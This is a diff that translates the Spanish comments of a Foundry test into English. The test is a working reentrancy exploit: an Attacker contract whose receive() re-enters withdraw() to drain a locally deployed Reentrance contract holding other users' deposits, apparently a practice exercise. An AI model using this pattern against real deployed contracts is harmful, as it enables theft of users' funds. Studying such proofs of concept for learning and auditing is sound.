@@ -4,7 +4,7 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "../src/Reentrance.sol";
 
-// Contrato atacante: su receive() vuelve a llamar withdraw() en bucle
+// Attacker contract: its receive() re-enters withdraw() in a loop.
 contract Attacker {
     Reentrance public target;
     uint256 public amount;
@@ -15,15 +15,15 @@ contract Attacker {
 
     function attack() external payable {
         amount = msg.value;
-        // 1. Depositamos para tener saldo registrado
+        // 1. Deposit to register a balance.
         target.donate{value: amount}(address(this));
-        // 2. Disparamos el primer retiro, que detonará la reentrada
+        // 2. Trigger the first withdrawal, which detonates the reentrancy.
         target.withdraw(amount);
     }
 
-    // Esta funcion se ejecuta CADA vez que el target nos envia ETH
+    // This runs every time the target sends us ETH.
     receive() external payable {
-        // Mientras el target tenga fondos, seguimos re-entrando
+        // While the target still has funds, keep re-entering.
         if (address(target).balance >= amount) {
             target.withdraw(amount);
         }
@@ -36,25 +36,25 @@ contract ReentranceExploit is Test {
 
     function setUp() public {
         target = new Reentrance();
-        // Simulamos que otros usuarios ya depositaron 5 ETH en el contrato
+        // Simulate other users having deposited 5 ETH into the contract.
         vm.deal(address(this), 5 ether);
         target.donate{value: 5 ether}(address(0xABCD));
     }
 
     function test_DrainViaReentrancy() public {
-        // El contrato arranca con 5 ETH de otros usuarios
-        assertEq(address(target).balance, 5 ether, "el target deberia tener 5 ETH");
+        // The contract starts with 5 ETH from other users.
+        assertEq(address(target).balance, 5 ether, "target should hold 5 ETH");
 
-        // El atacante ataca con apenas 1 ETH propio
+        // The attacker attacks with just 1 ETH of their own.
         attacker = new Attacker(target);
         vm.deal(address(this), 1 ether);
         attacker.attack{value: 1 ether}();
 
-        // Resultado: el contrato quedó vaciado pese a que el atacante solo puso 1 ETH
-        assertEq(address(target).balance, 0, "el target deberia quedar vacio");
-        assertGt(address(attacker).balance, 1 ether, "el atacante saco mas de lo que puso");
+        // Result: the contract is drained despite the attacker only putting in 1 ETH.
+        assertEq(address(target).balance, 0, "target should be empty");
+        assertGt(address(attacker).balance, 1 ether, "attacker withdrew more than deposited");
 
-        console.log("Balance final del atacante:", address(attacker).balance);
-        console.log("Exploit exitoso: reentrancy vacio el contrato");
+        console.log("Attacker final balance:", address(attacker).balance);
+        console.log("Exploit successful: reentrancy drained the contract");
     }
 }
